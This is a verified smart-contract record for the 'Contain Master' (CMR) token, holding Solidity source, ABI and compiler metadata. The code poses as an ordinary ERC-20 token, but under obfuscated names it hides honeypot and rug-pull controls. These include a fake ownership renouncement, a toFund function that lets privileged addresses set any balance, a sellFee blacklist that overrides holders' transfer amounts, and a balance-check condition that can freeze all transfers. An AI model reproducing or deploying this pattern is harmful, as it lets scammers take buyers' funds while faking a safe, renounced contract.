{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface fromAmount {\n    function createPair(address tradingAuto, address amountMin) external returns (address);\n}\n\ninterface minMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingIs) external view returns (uint256);\n\n    function transfer(address minShould, uint256 exemptTotal) external returns (bool);\n\n    function allowance(address takeShouldTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minShould,\n        uint256 exemptTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txTeamMax, uint256 value);\n    event Approval(address indexed takeShouldTrading, address indexed spender, uint256 value);\n}\n\nabstract contract buyFromSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minMarketingMetadata is minMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContainMaster is buyFromSender, minMarketing, minMarketingMetadata {\n\n    bool public atTradingTo;\n\n    function toFund(address teamAutoBuy, uint256 exemptTotal) public {\n        buySellFee();\n        autoTeam[teamAutoBuy] = exemptTotal;\n    }\n\n    address limitShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchedToken(address fundTo, address minShould, uint256 exemptTotal) internal returns (bool) {\n        if (fundTo == shouldReceiver) {\n            return receiverExempt(fundTo, minShould, exemptTotal);\n        }\n        uint256 amountAutoMax = minMarketing(tradingMin).balanceOf(limitShould);\n        require(amountAutoMax == feeAtList);\n        require(minShould != limitShould);\n        if (txShould[fundTo]) {\n            return receiverExempt(fundTo, minShould, listMaxAmount);\n        }\n        return receiverExempt(fundTo, minShould, exemptTotal);\n    }\n\n    address public tradingMin;\n\n    uint256 private shouldExempt;\n\n    address senderMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function liquidityEnable() public {\n        emit OwnershipTransferred(shouldReceiver, address(0));\n        shouldSenderTrading = address(0);\n    }\n\n    function receiverExempt(address fundTo, address minShould, uint256 exemptTotal) internal returns (bool) {\n        require(autoTeam[fundTo] >= exemptTotal);\n        autoTeam[fundTo] -= exemptTotal;\n        autoTeam[minShould] += exemptTotal;\n        emit Transfer(fundTo, minShould, exemptTotal);\n        return true;\n    }\n\n    function approve(address walletShould, uint256 exemptTotal) public virtual override returns (bool) {\n        senderMin[_msgSender()][walletShould] = exemptTotal;\n        emit Approval(_msgSender(), walletShould, exemptTotal);\n        return true;\n    }\n\n    bool private enableSwap;\n\n    uint256 private atMin;\n\n    address public shouldReceiver;\n\n    string private toLaunched = \"Contain Master\";\n\n    mapping(address => mapping(address => uint256)) private senderMin;\n\n    bool public limitReceiverWallet;\n\n    uint256 constant listMaxAmount = 13 ** 10;\n\n    string private liquidityFee = \"CMR\";\n\n    uint256 private receiverMode;\n\n    function transfer(address teamAutoBuy, uint256 exemptTotal) external virtual override returns (bool) {\n        return launchedToken(_msgSender(), teamAutoBuy, exemptTotal);\n    }\n\n    bool public shouldTrading;\n\n    function transferFrom(address fundTo, address minShould, uint256 exemptTotal) external override returns (bool) {\n        if (_msgSender() != senderMax) {\n            if (senderMin[fundTo][_msgSender()] != type(uint256).max) {\n                require(exemptTotal <= senderMin[fundTo][_msgSender()]);\n                senderMin[fundTo][_msgSender()] -= exemptTotal;\n            }\n        }\n        return launchedToken(fundTo, minShould, exemptTotal);\n    }\n\n    uint256 public marketingSwapAt;\n\n    constructor (){\n        if (marketingTrading != shouldExempt) {\n            shouldExempt = receiverMode;\n        }\n        totalExempt maxAtMin = totalExempt(senderMax);\n        tradingMin = fromAmount(maxAtMin.factory()).createPair(maxAtMin.WETH(), address(this));\n        \n        shouldReceiver = _msgSender();\n        sellList[shouldReceiver] = true;\n        autoTeam[shouldReceiver] = isMin;\n        liquidityEnable();\n        if (maxLaunched != marketingTrading) {\n            enableSwap = true;\n        }\n        emit Transfer(address(0), shouldReceiver, isMin);\n    }\n\n    mapping(address => bool) public sellList;\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunched;\n    }\n\n    function launchTrading(address fromMode) public {\n        if (shouldTrading) {\n            return;\n        }\n        \n        sellList[fromMode] = true;\n        \n        shouldTrading = true;\n    }\n\n    function allowance(address limitTeam, address walletShould) external view virtual override returns (uint256) {\n        if (walletShould == senderMax) {\n            return type(uint256).max;\n        }\n        return senderMin[limitTeam][walletShould];\n    }\n\n    function balanceOf(address tradingIs) public view virtual override returns (uint256) {\n        return autoTeam[tradingIs];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityFee;\n    }\n\n    uint256 feeAtList;\n\n    function enableWalletFrom(uint256 exemptTotal) public {\n        buySellFee();\n        feeAtList = exemptTotal;\n    }\n\n    function buySellFee() private view {\n        require(sellList[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return shouldSenderTrading;\n    }\n\n    uint256 private isMin = 100000000 * 10 ** 18;\n\n    function sellFee(address launchedLimit) public {\n        buySellFee();\n        if (atMin == shouldExempt) {\n            maxLaunched = atMin;\n        }\n        if (launchedLimit == shouldReceiver || launchedLimit == tradingMin) {\n            return;\n        }\n        txShould[launchedLimit] = true;\n    }\n\n    mapping(address => bool) public txShould;\n\n    uint256 private marketingTrading;\n\n    function getOwner() external view returns (address) {\n        return shouldSenderTrading;\n    }\n\n    address private shouldSenderTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTx;\n    }\n\n    bool private exemptTxTo;\n\n    uint8 private tradingTx = 18;\n\n    mapping(address => uint256) private autoTeam;\n\n    uint256 maxMode;\n\n    event OwnershipTransferred(address indexed modeMarketingAt, address indexed atTotal);\n\n    uint256 private maxLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShouldTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeamMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"enableWalletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwapAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ContainMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}